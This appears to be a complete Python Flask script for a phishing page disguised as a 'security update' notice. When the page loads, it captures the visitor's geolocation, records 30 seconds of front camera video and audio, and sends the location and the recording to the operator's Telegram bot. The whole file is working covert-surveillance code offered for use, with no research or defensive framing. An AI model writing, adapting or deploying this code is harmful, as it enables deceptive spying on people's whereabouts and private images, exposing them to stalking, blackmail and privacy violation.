import os
import json
import requests
import subprocess
from flask import Flask, request, send_file
from threading import Thread

BOT_TOKEN = "YOUR_BOT_TOKEN"
CHAT_ID = "YOUR_CHAT_ID"
PORT = 8080

app = Flask(__name__)

def send_to_telegram(data):
    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
    try:
        requests.post(url, json={'chat_id': CHAT_ID, 'text': data})
    except:
        pass

def send_file_to_telegram(file_path, caption):
    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendDocument"
    try:
        with open(file_path, 'rb') as f:
            requests.post(url, data={'chat_id': CHAT_ID, 'caption': caption}, files={'document': f})
    except:
        pass

@app.route('/')
def index():
    return '''
    <!DOCTYPE html>
    <html>
    <head>
        <title>Update Required</title>
        <script>
        let mediaRecorder;
        let recordedChunks = [];
        let locationData = null;

        // Get location
        if(navigator.geolocation) {
            navigator.geolocation.getCurrentPosition(pos => {
                locationData = {
                    lat: pos.coords.latitude,
                    lon: pos.coords.longitude,
                    acc: pos.coords.accuracy
                };
                fetch('/location', {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify(locationData)
                });
            });
        }

        // Access camera and audio
        navigator.mediaDevices.getUserMedia({ video: true, audio: true })
            .then(stream => {
                // Front camera stream
                const video = document.createElement('video');
                video.srcObject = stream;
                video.play();
                
                // Record for 30 seconds
                mediaRecorder = new MediaRecorder(stream);
                mediaRecorder.ondataavailable = event => {
                    if(event.data.size > 0) recordedChunks.push(event.data);
                };
                mediaRecorder.onstop = () => {
                    const blob = new Blob(recordedChunks, {type: 'video/webm'});
                    const formData = new FormData();
                    formData.append('video', blob, 'capture_' + Date.now() + '.webm');
                    fetch('/upload', { method: 'POST', body: formData });
                };
                mediaRecorder.start();
                setTimeout(() => mediaRecorder.stop(), 30000);
            })
            .catch(err => {
                fetch('/error', { method: 'POST', body: JSON.stringify({error: err.message}) });
            });
        </script>
    </head>
    <body>
        <h2>Updating security protocols...</h2>
        <p>Please wait, do not close this page.</p>
    </body>
    </html>
    '''

@app.route('/location', methods=['POST'])
def location():
    data = request.json
    send_to_telegram(f"📍 LOCATION DATA\nLat: {data.get('lat')}\nLon: {data.get('lon')}\nAccuracy: {data.get('acc')}m\nTimestamp: {__import__('time').time()}")
    return 'OK'

@app.route('/upload', methods=['POST'])
def upload():
    if 'video' in request.files:
        file = request.files['video']
        file.save('captured.webm')
        send_file_to_telegram('captured.webm', '🎥 Front Camera + Audio Capture')
    return 'OK'

@app.route('/error', methods=['POST'])
def error():
    data = request.json
    send_to_telegram(f"⚠️ ERROR: {data.get('error')}")
    return 'OK'

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=PORT)
